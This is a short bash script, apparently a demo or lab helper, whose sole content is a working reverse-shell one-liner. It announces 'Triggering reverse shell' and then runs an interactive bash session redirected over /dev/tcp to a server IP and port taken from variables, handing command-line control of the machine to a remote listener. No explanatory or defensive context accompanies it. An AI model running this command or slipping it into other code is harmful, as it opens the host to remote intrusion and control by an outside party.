#!/bin/bash
echo "Triggering reverse shell to $SERVER_IP:$SERVER_PORT ..."
TASK="example" /bin/bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1